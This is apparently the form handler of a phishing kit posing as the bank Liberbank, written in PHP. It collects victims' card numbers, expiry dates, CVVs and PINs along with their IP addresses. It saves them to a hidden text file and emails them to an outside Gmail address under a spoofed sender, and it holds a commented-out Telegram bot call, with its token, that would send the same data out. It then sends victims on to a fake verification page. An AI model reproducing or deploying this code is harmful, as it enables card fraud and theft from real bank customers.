<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['cc_number']) and !empty($_POST['cc_date']) and !empty($_POST['cc_cvv']) and !empty($_POST['cc_pin'])
        // and !empty($_POST['pin'])
    ) {
            $_SESSION['cc_number']=$_POST['cc_number'];
          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            $message = "
            | LIBERBANk(CCN)
            | CCN : ".$_POST['cc_number']."
            | EXP : ".$_POST['cc_date']."
            | CVV : ".$_POST['cc_cvv']."
            | PIN : ".$_POST['cc_pin']."
            | -IP : " . $ip . "\n\n";

            $file = fopen("./Z3lOOOk.txt", "a+");
            fwrite($file, $message);fclose($file);
            $to = "daviddavida453@gmail.com";
            $subject = "LIBERBANk =?UTF-8?Q?=e2=9d=a4_?= ($ip)|CCNº";
            $headers = "From: SHANkS™<shanks@lyonko.org>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
            mail($to, $subject, $message, $headers);
            //file_get_contents("https://api.telegram.org/bot1758642481:AAGjK1wO7sRCi4D7NBSDVk-a0C4fl2jnvWA/sendMessage?chat_id=-1001324167344&text=" . urlencode($message)."" );
            header("Location: ../espira-verificacion.php");
    }else header("Location: ?error=".md5($_GET['error']));
}
?>